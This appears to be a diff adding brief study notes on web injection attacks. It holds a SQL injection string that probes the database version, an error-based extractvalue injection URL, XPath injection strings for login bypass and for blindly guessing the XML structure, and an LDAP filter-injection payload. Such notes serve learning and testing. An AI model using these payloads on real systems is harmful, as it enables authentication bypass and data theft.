@@ -1,0 +1,26 @@
+{docId:"1 and (select substring(@@version,1,1))='M'", docTitle:'' }
+
+www.attack.com/index.php?id=2' and extractvalue(0x0a,concat(0x0a,query))
+
+
+
+Xpath injection for xpath query
+String(//users[LoginID/text()=' " + txtLoginID.Text + " ' and passwd/text()=' "+ txtPasswd.Text +" '])
+userid' or 1=1 or 'a'=b
+
+n place of 1=1 in the previous example, the expression given here checks if the first subnode's name is LoginID. The query formed is
+
+String(//users[LoginID/text()='abc' or name(//users/LoginID[1]) = 'LoginID' or 'a=b' and passwd/text()=''])
+
+If the attacker is authenticated it means that the guess was correct and the first sub-node is LoginID. 
+The attacker can then use this to extract more information.
+This provides the user with the information about the structure of the XML document.
+
+LDAP injection
+
+Let's suppose a web application uses a filter to match LDAP user/password pair.
+
+searchlogin= "(&(uid="+user+")(userPassword={MD5}"+base64(pack("H*",md5(pass)))+"))"
+
+user=*)(uid=*))(|(uid=*
+pass=password
